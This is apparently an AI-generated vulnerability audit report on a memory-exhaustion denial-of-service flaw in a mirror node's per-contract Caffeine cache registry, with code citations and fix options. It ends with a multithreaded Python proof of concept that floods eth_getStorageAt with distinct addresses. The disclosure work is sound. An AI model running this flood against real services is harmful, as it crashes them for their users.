All referenced code is confirmed. Here is my assessment:

---

Audit Report

## Title
Unbounded `CaffeineCacheManager` Internal Registry Leak via Distinct `contractId` Queries Enables Unauthenticated Memory Exhaustion DoS

## Summary
In `ContractStateServiceImpl.findStorageBatch()`, every distinct `contractId` causes `cacheManagerSlotsPerContract.getCache(contractId.toString())` to register a new named `CaffeineCache` in the `CaffeineCacheManager`'s internal `ConcurrentHashMap`. This internal registry has no size limit and is never pruned, even when the outer `contractSlotsCache` (bounded to 3,000 entries) evicts the corresponding entry. An unauthenticated attacker can exhaust JVM heap memory by issuing public JSON-RPC calls with millions of distinct contract addresses, causing an OOM crash and complete service denial.

## Finding Description

**Exact code location confirmed:**

`ContractStateServiceImpl.java` lines 86–87:
```java
final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
    contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
``` [1](#0-0) 

The outer cache `contractSlotsCache` is configured with `expireAfterAccess=5m,maximumSize=3000`, confirmed in `CacheProperties.java`: [2](#0-1) 

The `cacheManagerSlotsPerContract` bean is declared **without** `setCacheNames()`, placing it in dynamic mode — confirmed in `EvmConfiguration.java`: [3](#0-2) 

Compare this to every other `CaffeineCacheManager` bean in the same file, which all call `setCacheNames(Set.of(...))` to pre-register a fixed set of names and prevent dynamic growth: [4](#0-3) 

**Root cause — lifecycle mismatch:**

Spring's `CaffeineCacheManager.getCache(name)` in dynamic mode stores every created `CaffeineCache` in an internal `ConcurrentHashMap<String, Cache>` (`cacheMap` field). This map has no eviction policy and no size limit. When the outer `contractSlotsCache` evicts an entry for `contractId_X` (due to `maximumSize=3000`), the sub-cache object is removed from the outer cache's data structure, but `cacheManagerSlotsPerContract`'s internal `cacheMap` still holds a strong reference to it under the key `contractId_X.toString()`. It is never removed.

The `maximumSize=1500` in `slotsPerContract` config applies only to the number of slot-key entries *within* each sub-cache, not to the number of sub-caches registered in the manager: [5](#0-4) 

The vulnerable path is active by default (`enableBatchContractSlotCaching = true`): [6](#0-5) 

**Exploit flow:**
1. Attacker sends `eth_getStorageAt(address_N, slot, "latest")` for N = 1, 2, 3, … with distinct addresses (no authentication required).
2. Each call reaches `findStorageBatch()`.
3. For each new `contractId`, the outer cache misses and the value loader fires `cacheManagerSlotsPerContract.getCache(contractId.toString())`.
4. A new `CaffeineCache` is created and inserted into `cacheManagerSlotsPerContract`'s internal `ConcurrentHashMap`.
5. After 3,001 distinct contractIds, the outer cache begins evicting old entries. The evicted sub-caches remain in `cacheManagerSlotsPerContract.cacheMap`.
6. After N total distinct contractIds, `cacheManagerSlotsPerContract.cacheMap` holds N entries. Memory grows without bound.

**Why existing checks are insufficient:**
- The outer `maximumSize=3000` only limits the outer cache's live entries; it has no effect on `cacheManagerSlotsPerContract`'s internal registry.
- `expireAfterAccess=5m` on the outer cache causes eviction of old entries but does not trigger any cleanup in `cacheManagerSlotsPerContract`.
- The rate limit of `requestsPerSecond=500` slows the attack but does not prevent it.

## Impact Explanation
Each `CaffeineCache` / `BoundedLocalCache` object carries non-trivial heap overhead (internal segment arrays, timer wheel, reference queues, etc.) — conservatively 2–10 KB per instance even when empty. At 1 million sub-caches this is 2–10 GB of heap. The JVM will throw `OutOfMemoryError`, crashing the web3 service and preventing all contract call processing. The attack is permanent until the process is restarted, and can be repeated immediately after restart.

## Likelihood Explanation
The attack requires only the ability to send unauthenticated HTTP JSON-RPC requests — no private keys, no tokens, no on-chain transactions. The attacker needs only a list of distinct Ethereum-format addresses (trivially generated). The rate limit of 500 RPS is a throttle, not a barrier; a single attacker machine can sustain this rate indefinitely. The `enableBatchContractSlotCaching` flag is `true` by default, so no special configuration is needed to trigger the vulnerable path.

## Recommendation
The core fix is to eliminate the use of `CaffeineCacheManager` as a dynamic factory for per-contract sub-caches, since its internal registry is unbounded by design. Options:

1. **Preferred — flat composite-key cache:** Replace the two-level cache design with a single flat `CaffeineCache` keyed by `(contractId, slotKey)`. The `contractStateCache` already does this via `generateCacheKey(contractId, slotKey)`. The batch-loading behavior can be preserved by tracking requested slot keys per contract in a separate bounded `LoadingCache<EntityId, Set<ByteBuffer>>` built directly with Caffeine (not via `CaffeineCacheManager`), so no unbounded registry is involved.

2. **Eviction listener approach:** Add a Caffeine `removalListener` to the outer `contractSlotsCache` that, on eviction of `contractId_X`, explicitly removes the corresponding entry from `cacheManagerSlotsPerContract`'s internal map. This requires either exposing a `removeCache(name)` method (not present in Spring's `CaffeineCacheManager`) or replacing `CaffeineCacheManager` with a custom implementation that supports removal.

3. **Pre-register fixed names (not applicable here):** Calling `setCacheNames()` prevents dynamic creation, but since cache names are dynamic contract IDs, this approach cannot be used directly.

Option 1 is the cleanest and avoids the architectural mismatch entirely.

## Proof of Concept
```python
import requests, itertools, threading

URL = "http://<web3-service>/api/v1/contracts/results"
# Or via JSON-RPC:
JSONRPC = "http://<web3-service>/"

def make_address(n):
    return "0x" + hex(n)[2:].zfill(40)

def attack():
    for n in itertools.count(1):
        addr = make_address(n)
        payload = {
            "jsonrpc": "2.0", "method": "eth_getStorageAt",
            "params": [addr, "0x0", "latest"], "id": n
        }
        try:
            requests.post(JSONRPC, json=payload, timeout=2)
        except:
            pass

# Launch with multiple threads to approach 500 RPS rate limit
threads = [threading.Thread(target=attack) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

Each iteration registers a new `CaffeineCache` in `cacheManagerSlotsPerContract`'s internal `ConcurrentHashMap`. After the outer cache's 3,000-entry limit is exceeded, evicted sub-caches accumulate in the manager's registry. JVM heap exhaustion follows as N grows.

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L86-87)
```java
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L25-25)
```java
    private String contractSlots = "expireAfterAccess=5m,maximumSize=3000,recordStats";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L30-30)
```java
    private boolean enableBatchContractSlotCaching = true;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L39-39)
```java
    private String slotsPerContract = "expireAfterAccess=5m,maximumSize=1500";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L75-81)
```java
    @Bean(CACHE_MANAGER_CONTRACT_SLOTS)
    CacheManager cacheManagerContractSlots() {
        CaffeineCacheManager cacheManager = new CaffeineCacheManager();
        cacheManager.setCacheNames(Set.of(CACHE_NAME));
        cacheManager.setCacheSpecification(cacheProperties.getContractSlots());
        return cacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L107-112)
```java
    @Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
    CaffeineCacheManager cacheManagerSlotsPerContract() {
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
        return caffeineCacheManager;
    }
```
